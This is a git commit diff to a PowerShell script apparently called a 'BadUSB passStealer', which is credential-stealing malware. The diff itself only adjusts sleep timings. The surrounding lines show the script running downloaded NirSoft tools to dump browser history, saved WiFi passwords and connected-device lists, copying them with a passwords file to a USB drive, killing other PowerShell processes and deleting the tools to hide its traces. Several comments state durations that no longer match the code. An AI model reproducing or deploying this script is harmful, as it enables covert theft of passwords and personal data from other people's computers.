29ce0a5ead4981dce12e38c0fb6f54a196c1575f
ArllisPLEU <89700979+ArllisPLEU@users.noreply.github.com>
2023-09-14 22:04:39 +0200

    Update ciaoV2.ps1

--- ciaoV2.ps1
+++ ciaoV2.ps1
@@ -9,14 +9,14 @@ Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/ma
 .\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext history.txt #Create the file for Browser history
 .\WirelessKeyView.exe /stext wifi.txt #Create the file for WiFi passwords
 .\WNetWatcher.exe /stext connected_devices.txt #Create the file for connected devices
-Start-Sleep -Seconds 25 #Wait for 60 seconds (because connected devices file take a minute to be created)
+Start-Sleep -Seconds 35 #Wait for 60 seconds (because connected devices file take a minute to be created)
 Copy-Item C:\Users\Public\Documents\wifi.txt -Destination E:\Passwords
 Copy-Item C:\Users\Public\Documents\history.txt -Destination E:\Passwords
 Copy-Item C:\Users\Public\Documents\passwords.txt -Destination E:\Passwords
 Copy-Item C:\Users\Public\Documents\connected_devices.txt -Destination E:\Passwords
-Start-Sleep -Seconds 15 #Wait 15 seconds
+Start-Sleep -Seconds 5 #Wait 15 seconds
 Get-Process Powershell  | Where-Object { $_.ID -ne $pid } | Stop-Process #Kill all powershell process except the one running
-Start-Sleep -Seconds 10 #Wait 30 seconds
+Start-Sleep -Seconds 5 #Wait 30 seconds
 #Delete nirsoft tools and .ps1 file
 Remove-Item BrowsingHistoryView.exe
 Remove-Item WNetWatcher.exe
